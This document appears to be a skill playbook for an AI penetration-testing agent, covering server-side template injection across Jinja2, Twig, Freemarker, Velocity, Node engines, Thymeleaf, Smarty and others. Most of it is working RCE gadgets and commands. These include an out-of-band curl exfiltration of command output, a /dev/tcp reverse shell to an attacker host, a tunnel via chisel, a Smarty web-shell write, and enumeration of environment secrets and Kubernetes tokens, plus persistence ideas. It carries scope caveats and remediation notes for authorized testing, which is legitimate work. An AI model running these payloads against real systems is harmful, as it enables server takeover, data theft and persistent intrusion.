# Server-Side Template Injection Attack Skill

Black-box workflow dedicated to Server-Side Template Injection: fingerprint the rendering engine, escape its sandbox, and chain to code execution across Jinja2, Twig, Freemarker, Velocity, EJS, Thymeleaf, Smarty, Mako, Pebble, Handlebars, and Pug. Use this skill when a parameter, header, error message, or notification template appears to be evaluated server-side and you need an engine-specific exploitation playbook rather than generic command-injection probing.

## When to Classify Here

Pick this skill when the request is specifically about template-engine evaluation of attacker-controlled input. Concrete triggers include:

- "Test for SSTI on the bulk-email preview field."
- "Find template injection in the report generator."
- "We see `{{7*7}}` rendering as 49 on the contact form, can you escalate?"
- "Escape the Jinja2 sandbox in this Flask app."
- "Confirm Freemarker / Velocity / Thymeleaf SSTI and pop a shell."
- "Trigger SSTI via the user-controlled error template."
- "Walk the polyglot probe across templating engines until one fires."

Keywords: SSTI, server-side template injection, template injection, sandbox escape, jinja, jinja2, twig, freemarker, velocity, thymeleaf, smarty, mako, pebble, handlebars, EJS, pug, dotliquid, `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`, `__class__`, `__mro__`, `__subclasses__`, `cycler.__init__`, `_self.env`, freemarker.template.utility.Execute, `getRuntime().exec`, sstimap, tplmap.

### Disjoint from neighbouring skills

- vs. `rce` (built-in): the built-in `rce` skill is the umbrella for command injection, deserialization, OGNL/SpEL, media-pipeline RCE and Log4Shell-style chains; classify the user request HERE only when the entry point is template evaluation (an engine renders attacker-controlled markup) or when the user explicitly mentions SSTI, an engine name (Jinja2/Twig/Freemarker/Velocity/Smarty/Mako/Pebble/Thymeleaf/EJS/Handlebars), or one of the canonical SSTI probes (`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`). Generic "get a shell on the server" or "exploit deserialization" stays with `rce`.
- vs. `sql_injection`: SQLi targets the database; SSTI targets a template renderer. They never overlap on the same finding even when both ride the same parameter.
- vs. `xss`: XSS triggers in the victim browser; SSTI executes on the server. A `{{...}}` value that only echoes into HTML without server-side evaluation is XSS, not SSTI.
- vs. `path_traversal`: path traversal reads files via `../` or PHP wrappers; this skill reaches files only as a side-effect of in-template I/O primitives once the sandbox is escaped.
- vs. `cve_exploit`: a known CVE in a templating library (for example CVE-2022-22954 Spring Cloud Gateway SpEL, CVE-2019-3396 Confluence Widget Connector, CVE-2017-12629 Solr Velocity) belongs to `cve_exploit` when the user asks for the CVE by ID. If the user wants to discover and weaponize SSTI from scratch on an unknown stack, stay HERE.
- vs. existing community skills (`api_testing`, `sqli_exploitation`, `xss_exploitation`, `xxe`, `idor_bola_exploitation`, `bfla_exploitation`, `mass_assignment`, `insecure_deserialization`): none of them cover server-side template evaluation. Pick this one whenever the attacker primitive is "the server renders my markup". The closest neighbour is `insecure_deserialization`, but deserialization fires on raw object streams (Java `ObjectInputStream`, PHP `unserialize`, Python `pickle`, .NET `BinaryFormatter`, Ruby `Marshal`), while SSTI fires on a templating engine evaluating attacker-supplied syntax.

## Tools

Every step uses tools already available to the agent. The only new install is `tplmap`, which runs from `/opt/tplmap` in its own venv and complements `sstimap` on Smarty and Velocity.

- `query_graph` to inventory candidate Endpoints, Parameters, Headers, Technologies, and known framework cookies for the target host.
- `execute_httpx` for fast HTTP fingerprinting (server header, page title, tech detection).
- `execute_arjun` for hidden-parameter discovery on candidate sinks.
- `execute_curl` for crafted single-shot probes and exploit requests.
- `execute_code` for hand-rolled per-engine payload sweeps (Pug, Handlebars, Nunjucks, Razor, Thymeleaf view-name confusion) where neither `sstimap` nor `tplmap` covers the engine.
- `execute_playwright` to confirm reflection context (HTML attribute, JS string, CDATA) on JS-heavy SPAs.
- `kali_shell` for `sstimap`, `tplmap`, `interactsh-client` (OAST), `chisel`, `ngrok`, and any one-off `jq` post-processing.

### Captured-traffic workflow (proxy_brain tools)

When HTTP Traffic Capture is enabled, redamon.fuzz sprays the arithmetic and polyglot probes (`{{7*7}}`, `${7*7}`, the `${{<%[%'"}}%\` polyglot) over one captured query param and reports per-payload status/length; redamon.grep then scans response bodies for a tell-tale `49` or an engine parse-error (`jinja2.exceptions.TemplateSyntaxError`, `freemarker.core.ParseException`, `Twig\Error\SyntaxError`). Once the engine is fingerprinted, redamon.replay fires an engine-specific gadget from a captured request. Where the proxy stops: sandbox-escape to RCE still runs through sstimap/tplmap plus OOB confirmation and shell staging; redamon.fuzz iterates only a query param, so body/header injection points need iterated redamon.replay.

## Workflow

The workflow follows three phases. Phase 1 is non-destructive: graph review, candidate enumeration, and a polyglot probe that fires across every common engine to fingerprint the renderer. Phase 2 weaponizes the fingerprint with engine-specific sandbox escapes. Phase 3 stabilises code execution and demonstrates impact. If the engagement forbids out-of-band callbacks (no interactsh, no DNS exfil), prefer the inline-output and timing oracles called out in each phase rather than the OAST variants.

### Phase 1: Reconnaissance and Engine Fingerprinting (Informational)

1. **Inventory candidate sinks via `query_graph`**: ask "list all Endpoints with parameters and any Header nodes that mention server, x-powered-by, or content-type for the target host". Also pull `Technologies` for the host so you know up-front whether it is a Flask/Django (Jinja2), Symfony/Drupal (Twig), Spring (Thymeleaf/Freemarker/Velocity), Java EE (Velocity/Freemarker), Node/Express (EJS/Pug/Handlebars), Ruby on Rails (ERB/Slim/Liquid), or PHP (Smarty/Twig/Plates) stack. The detected framework drives the per-engine probe order in step 4.

2. **Enrich with HTTP fingerprinting** when the graph is thin. Use `execute_httpx`:
   ```
   -u https://target.tld -sc -title -server -td -fr -silent -j
   ```
   Note the `Server`, `X-Powered-By`, and `Set-Cookie` (for example `JSESSIONID` -> Java, `connect.sid` -> Node, `laravel_session` -> PHP, `csrftoken`/`sessionid` -> Django).

3. **Discover hidden parameters that may feed a template**. Common high-yield surfaces: search query, name, subject, message body, error template path, theme/skin selector, email-preview body, report-template name, notification template, slug. Run `execute_arjun`:
   ```
   -u https://target.tld/path -m GET -oJ /tmp/arjun_get.json
   -u https://target.tld/path -m POST -oJ /tmp/arjun_post.json
   ```
   Cross-check with `kali_shell`:
   ```
   paramspider -d target.tld
   ```

4. **Polyglot fingerprint probe** against each candidate parameter. Submit one short string that produces a different observable in every engine. Any reflection that contains evaluated arithmetic confirms server-side rendering.
   ```
   ${{<%[%'"}}%\
   ```
   Observe the response: a `500` with a parser stack trace usually leaks the engine name (`freemarker.core.ParseException`, `org.apache.velocity.exception.ParseErrorException`, `jinja2.exceptions.TemplateSyntaxError`, `Twig\Error\SyntaxError`, `EJS Error`, `Smarty: syntax error`). Run with `execute_curl`:
   ```
   -s -o /dev/null -w "%{http_code}\n" "https://target.tld/path?inj=$%7B%7B%3C%25%5B%25%27%22%7D%7D%25%5C"
   ```
   If the response renders cleanly, move to step 5. If the body echoes the polyglot literally without execution, drop to a pure XSS path and re-classify out of this skill.

5. **Engine-specific arithmetic confirmation**. Send each probe one at a time and watch for `49` or the engine-native rendering of the expression. Stop at the first hit.

   | Engine | Probe | Confirms when reflection contains |
   |---|---|---|
   | Jinja2, Twig, Liquid, Pebble, Nunjucks | `{{7*7}}` | `49` |
   | Freemarker, Velocity, Thymeleaf, JSP-EL, Spring SpEL, Mako | `${7*7}` | `49` |
   | EJS, ERB, JSP scriptlet | `<%= 7*7 %>` | `49` |
   | Pug | `#{7*7}` | `49` |
   | Thymeleaf preprocessing | `*{7*7}` | `49` |
   | Smarty | `{$smarty.version}` | a version string such as `4.x` |
   | Handlebars | `{{this}}` then `{{constructor.constructor("return 7*7")()}}` | `49` |
   | Razor (.NET) | `@(7*7)` | `49` |

6. **Differentiate engines that share `{{...}}` syntax** (Jinja2 vs. Twig vs. Pebble vs. Liquid). Use the Strix-style discriminators:
   - Jinja2 evaluates `{{7*'7'}}` to `7777777`. Twig evaluates the same to `49`.
   - Twig accepts `{{7*'7'}}` as integer 49 and provides `{{_self.env}}`.
   - Liquid is sandboxed and rejects most filters; `{{ 7 | times: 7 }}` yields 49.
   - Pebble accepts `{{ 'a' + 'b' }}` -> `ab` and exposes `{{ self.environment }}` only when not sandboxed.
   - Nunjucks accepts `{{ range(0, 1) }}` and surfaces `{{ joiner }}` from the runtime.

7. **Determine context (HTML, JS, attribute, code-block)**. Browse the rendered page with `execute_playwright` to see whether the reflection sits inside an HTML attribute, a JS string, a CDATA block, or a CSS context. Different contexts force different escape sequences before the SSTI braces (a leading `"`, `--`, `*/`, `</textarea>`, etc.).

8. **Sandbox classification**. Note whether the response surfaces "method not allowed" / "object has no attribute" style errors when probing internals (`{{config}}`, `{{self}}`, `{{request}}`). These narrow the sandbox and pick the right escape gadget in Phase 2.

Once the engine is fingerprinted, the candidate parameter is confirmed as a server-rendered sink, and the sandbox profile is understood, **request transition to exploitation phase**.

### Phase 2: Exploitation

Pick the engine-specific track that matches the Phase 1 fingerprint and run it from least invasive (read internals, blind OAST) to most invasive (file write, full RCE). Stop at the lowest impact level that satisfies the engagement objective. Every track ends in a Validation step.

#### 2.A Jinja2 (Flask / Django-Jinja / Ansible templates)

1. **Internal class walk** to confirm sandbox is not strict:
   ```
   {{ ''.__class__.__mro__[1].__subclasses__() }}
   ```
   Send via `execute_curl`:
   ```
   --data-urlencode "inj={{ ''.__class__.__mro__[1].__subclasses__() }}" https://target.tld/path
   ```
2. **Modern stable RCE gadget** (works on modern Jinja2 even without `os` import):
   ```
   {{ cycler.__init__.__globals__.os.popen('id').read() }}
   ```
   Variants for filtered environments:
   ```
   {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
   {{ namespace.__init__.__globals__.os.popen('id').read() }}
   {{ joiner.__init__.__globals__.os.popen('id').read() }}
   ```
3. **Filter-bypassed variants** when `_`, `.`, `os`, `popen` are blocked:
   - Attribute by string: `{{ ''['__cl''ass__'] }}`.
   - `request.args.x` smuggle: store the dotted path in a query parameter (`?x=__class__`) and reference `{{ ''[request.args.x] }}`.
   - `attr` filter (Twig + Jinja-like): `{{ ''|attr('__class__') }}`.
4. **Blind oracle via OAST** when output is suppressed:
   ```
   {{ cycler.__init__.__globals__.os.popen('curl http://OAST.tld/$(id|base64 -w0)').read() }}
   ```
   Spin the listener first:
   ```
   kali_shell> interactsh-client -v -o /tmp/oast.log
   ```
5. **Automated path** via `kali_shell`:
   ```
   sstimap -u "https://target.tld/path?inj=*" --engine jinja2 --os-shell
   ```
   If sstimap rejects the engine, fall back to:
   ```
   tplmap -u "https://target.tld/path?inj=test" --os-shell
   ```
6. **Validation**: capture `id`, `hostname`, `cat /etc/hostname`, and a UUID written into `/tmp/redamon-<random>.txt`. Re-read via the same gadget to prove process identity.

#### 2.B Twig (Symfony / Drupal / Craft / OctoberCMS)

1. **Class probe** using `_self`:
   ```
   {{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}
   ```
2. **Twig 2 / 3 environments without `_self.env`**:
   ```
   {{ {0:1} | call_user_func("system", "id") }}
   ```
   Or via `filter` smuggling:
   ```
   {{ ['id'] | filter('system') }}
   ```
3. **Drupal-specific** (Twig sandbox is enabled by default; pivot through cache or template_preprocess overrides):
   ```
   {{ _self.env.getRuntimeLoader().load("Twig\\Loader\\FilesystemLoader") }}
   ```
4. **Automated**: `sstimap -u "https://target.tld/path?inj=*" --engine twig --os-shell`.
5. **Validation**: same as 2.A.

#### 2.C Freemarker (Spring, Liferay, Confluence, Atlassian stack)

1. **Execute via `freemarker.template.utility.Execute`** when sandbox is permissive:
   ```
   <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
   ```
2. **Sandbox-bypassing alternative** (`?api` introspection on Freemarker >= 2.3.22):
   ```
   ${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder", ["id"]).start()}
   ```
   Or via `JythonRuntime`:
   ```
   <#assign value="freemarker.template.utility.JythonRuntime"?new()>${value("import os;os.system('id')")}
   ```
3. **Confluence Widget Connector / Atlassian** historic chain (CVE-2019-3396 family) is in `cve_exploit` territory; if user gives the CVE, defer there. Otherwise reach RCE via `Execute` above.
4. **Automated**: `sstimap -u "https://target.tld/path?inj=*" --engine freemarker --os-shell`.
5. **Validation**: capture stdout of `id`, `whoami`, `uname -a` plus `cat /proc/1/cgroup` to detect containerisation.

#### 2.D Velocity (older Java stacks, Apache Solr, Confluence)

1. **Classic Runtime gadget**:
   ```
   #set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($exec=$rt.getMethod("exec",$x.class).invoke($rt.getMethod("getRuntime").invoke($null),"id"))$exec.waitFor()
   ```
2. **Solr Velocity (CVE-2019-17558 family)** uses the `params.resource.loader` config flip; if discovered, defer to `cve_exploit`. Otherwise, the gadget above is the path.
3. **Automated**: `sstimap` plugin set is incomplete on Velocity. Prefer `tplmap`:
   ```
   tplmap -u "https://target.tld/path?inj=test" -e velocity --os-shell
   ```
4. **Validation**: `id`, `hostname`, `ls -la /opt`.

#### 2.E EJS / Pug / Handlebars / Nunjucks (Node.js)

1. **EJS** (Express default when `app.engine('html', require('ejs').renderFile)`):
   ```
   <%= global.process.mainModule.require('child_process').execSync('id').toString() %>
   ```
   Filter-bypass for EJS opts when `<%` is escaped: switch to `process.binding('spawn_sync').spawn({ ... })`.
2. **Pug**:
   ```
   #{global.process.mainModule.require('child_process').execSync('id')}
   ```
   When indentation is enforced (Pug is whitespace-sensitive), wrap in a single line via `=#{...}`.
3. **Handlebars** (sandbox bypass via `constructor.constructor`):
   ```
   {{#with "constructor"}}{{#with split as |s|}}{{this.pop}}{{this.push (lookup (lookup s 'constructor') 'constructor')}}{{this.pop}}{{#with this}}{{#with (this.pop "return process.mainModule.require('child_process').execSync('id').toString()") as |x|}}{{x}}{{/with}}{{/with}}{{/with}}{{/with}}
   ```
4. **Nunjucks**:
   ```
   {{ range.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}
   ```
5. **Automated**: `sstimap` does NOT yet cover Pug/Handlebars/Nunjucks reliably. Use `tplmap` or pivot to manual via `execute_code` with a custom HTTP loop in Python:
   ```
   execute_code> language="python", code: """
   import requests
   payloads = [
     "<%= global.process.mainModule.require('child_process').execSync('id') %>",
     "#{global.process.mainModule.require('child_process').execSync('id')}",
     "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
   ]
   for p in payloads:
       r = requests.get('https://target.tld/path', params={'inj': p}, timeout=10, verify=False)
       if 'uid=' in r.text:
           print('HIT:', p, '->', r.text[:200])
   """
   ```
6. **Validation**: standard `id`, `hostname`, plus `node --version` from the same gadget to confirm Node runtime.

#### 2.F Thymeleaf (Spring Boot)

Thymeleaf SSTI lives behind two distinct sinks: fragment expressions (`~{...}`) and unsafe Spring view names. The latter is the common bug.

1. **Fragment-expression preprocessing** (Thymeleaf 3.x with `text/template-mode`):
   ```
   *{T(java.lang.Runtime).getRuntime().exec("id")}
   ```
2. **Spring view-name confusion** (template path comes from user input, no allowlist):
   - Send `view=__$\{T(java.lang.Runtime).getRuntime().exec("id")}__::.x`.
   - When the application calls `return "user/" + viewName;` and Thymeleaf renders the path, Spring evaluates the SpEL expression embedded in the view name.
3. **Automated**: `sstimap` does cover Thymeleaf preprocessing; for view-name confusion drive manual via `execute_curl` and read the response body / Tomcat error log echo.
4. **Validation**: `id`, plus inspect `java.lang.System.getProperty("user.dir")` via the same gadget to prove JVM context.

#### 2.G Smarty (PHP, legacy)

Smarty 3.1.30+ disabled `{php}` blocks by default; use the Strix-style alternative gadgets.

1. **`Smarty_Internal_Write_File` write-to-disk to RCE** chain when `cache_dir` is web-served:
   ```
   {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['c']); ?>",self::clearConfig())}
   ```
2. **Reflection via `self::clearConfig()` / `self::set...`** for older Smarty:
   ```
   {self::getStreamVariable("file:///etc/passwd")}
   ```
3. **`{php}` block** if the target runs an unhardened legacy build:
   ```
   {php}system('id');{/php}
   ```
4. **Automated**: `tplmap` is the only reliable Smarty path right now. `tplmap -u "https://target.tld/path?inj=test" -e smarty --os-shell`.
5. **Validation**: `id`, `php -v`, and `cat /etc/passwd` if the engagement allows.

#### 2.H Mako (Pylons / older Pyramid)

```
<%
import os
x = os.popen('id').read()
%>
${x}
```
Inline form for a single line of input:
```
${self.module.cache.util.os.system('id')}
```
Automated: `sstimap -u "https://target.tld/path?inj=*" --engine mako --os-shell`.

#### 2.I Pebble, Liquid, ERB, Razor (.NET), DotLiquid

Quick-reference RCE primitives for less-common engines:

- **Pebble (Java)**: `{{ variable.getClass().forName("java.lang.Runtime").getRuntime().exec("id") }}` (only when sandbox is disabled).
- **ERB (Ruby on Rails)**: `<%= `id` %>` (backticks). Hardened path: `<%= system('id') %>` or `<%= IO.popen('id').read %>`.
- **Razor (.NET ASP.NET)**: `@System.Diagnostics.Process.Start("/bin/sh","-c id")`.
- **DotLiquid (.NET, sandboxed)**: typically not exploitable to RCE; treat as info disclosure of object properties only.
- **Liquid (Shopify)**: hardened by design; report any reflection but do NOT escalate without explicit scope authorization since Shopify SaaS targets are out of bounds for most engagements.

### Phase 3: Post-Exploitation

Once code execution is proven, demonstrate impact at the minimum level required by the engagement.

1. **Stable shell upgrade** (only if engagement scope permits a foothold):
   - Stage a tunnel: `chisel server -p 8080 --reverse` on the attacker host, then through the SSTI gadget run `chisel client ATTACKER:8080 R:9001:127.0.0.1:9001`.
   - Or use a single connect-back: `bash -c 'bash -i >& /dev/tcp/ATTACKER/9001 0>&1'` wrapped in the engine-specific exec primitive.
2. **Configuration and secret enumeration** through the same in-template `popen` / `exec` primitive:
   ```
   cat /proc/self/environ; ls -la /run/secrets/ 2>/dev/null; cat /var/lib/cloud/data/instance-id 2>/dev/null
   ```
3. **Container vs. bare-metal awareness**: run `cat /proc/1/cgroup`, look for `/docker/`, `/kubepods/`, `/lxc/`. Pivot decisions:
   - In a container with `docker.sock` mounted (`ls -la /var/run/docker.sock`): defer to the `rce` built-in container-escape branch.
   - In a Kubernetes pod (`/var/run/secrets/kubernetes.io/serviceaccount/token`): collect token + CA cert, hand off to a Kubernetes-focused workflow.
4. **Persistence (only if explicitly authorized)**: cron entry, systemd user service, web shell behind auth. Never persist on read-only test environments.
5. **OOB confirmation** when output is suppressed: keep `interactsh-client` running and tag every gadget with a unique subdomain (`<uuid>.<oast>`) so individual proofs can be replayed in the report.

## Reporting Guidelines

Final report must include the following fields per finding:

- **Engine** confirmed (Jinja2 / Twig / Freemarker / Velocity / EJS / Pug / Handlebars / Nunjucks / Thymeleaf / Smarty / Mako / Pebble / Razor / Liquid / DotLiquid / ERB).
- **Sink** description: parameter name, HTTP method, endpoint URL, request shape (form, JSON, query, header, multipart).
- **Sandbox profile**: strict, partial, none. List which gadgets were blocked.
- **Minimal probe** that confirmed evaluation (`{{7*7}}` or its equivalent) plus the rendered response excerpt.
- **Working exploit**: copy-paste curl request that reproduces command execution. Include the exact gadget used.
- **Proof of execution**: stdout of `id`, `hostname`, plus a uniquely named file written under `/tmp/` and re-read in a follow-up request.
- **Process context**: uid/gid, working directory, container indicators, JVM/Node/Python version.
- **Blast radius**: which secrets, mounts, internal services, or cloud-metadata endpoints are reachable from the SSTI process.
- **CVSS**: typically 9.8 (network, low complexity, no auth, RCE) when no authentication is required for the sink. Adjust downward only if the sink is authenticated or sandboxed.
- **Remediation**: enable sandbox, switch to logic-less templates, allowlist template names server-side, never feed user input directly into template strings.
- **References**: PortSwigger SSTI labs, James Kettle "Server-Side Template Injection" 2015 paper, HackTricks SSTI page.

## Important Notes

- **Black-box only**: this skill assumes no source-code access. Engine fingerprinting must come from response behaviour, error strings, framework cookies, and Tech node hints in the graph. Never imagine source-code review steps.
- **Engagement scope**: SSTI usually lands a 9.8 CVSS in seconds. Stop at proof of `id` if the engagement is informational. Do not drop persistent shells unless the rules of engagement explicitly authorize it.
- **OOB-blocked environments**: if the target cannot reach interactsh, switch to inline-output gadgets (return the command output in the rendered response) and timing oracles (`sleep 5` inside the exec primitive). Tag the finding so the report explicitly notes that DNS/HTTP exfil was unavailable.
- **Destructive payload guardrails**: avoid gadgets that write to template caches, plugin directories, or shared file mounts unless you can roll back. The `Smarty_Internal_Write_File` chain is destructive by nature; require explicit operator authorization before running it.
- **Tool fallback ladder**: `sstimap` first (covers Jinja2, Twig, Freemarker, Velocity, Mako, Tornado, Pebble), `tplmap` second (adds Smarty and stronger Velocity coverage, runs from `/opt/tplmap` in its own venv), then `execute_code` with a hand-rolled Python loop for Pug, Handlebars, Nunjucks, Thymeleaf view-name confusion, and Razor. If both `sstimap` and `tplmap` fail to install or run, the Phase 2 manual `execute_curl` payload tables are sufficient on their own.
- **CVE handoff**: known templating-library CVEs (CVE-2017-12629 Solr Velocity, CVE-2019-3396 Confluence Widget Connector, CVE-2022-22954 Spring Cloud Gateway SpEL, CVE-2021-26084 Confluence OGNL) belong to the `cve_exploit` skill when the user mentions the CVE ID. This skill stays focused on discovery and weaponization on unknown stacks.
- **No em dashes** anywhere in artefacts that flow into the final report. Use hyphens.
- **Reference reading**: PortSwigger Web Security Academy SSTI labs, HackTricks SSTI matrix, James Kettle "Server-Side Template Injection: RCE for the modern webapp" (2015), the Strix `rce.md` SSTI subsection that seeded this playbook.
